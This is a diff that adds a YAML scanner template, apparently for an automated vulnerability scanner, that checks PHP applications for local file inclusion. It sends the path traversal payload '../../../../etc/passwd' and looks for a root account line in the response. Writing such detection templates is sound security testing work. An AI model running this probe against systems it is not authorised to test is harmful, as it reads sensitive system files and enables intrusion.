@@ -1,0 +1,21 @@
+id: patt-lfi-basic-01-path
+name: 'PATT lfi patt-lfi-basic-01 via path'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+requires:
+  - php
+description: 'PATT baseline traversal (do not claim needs 6+ depth + other encodings). [patt:patt-lfi-basic-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - '../../../../etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
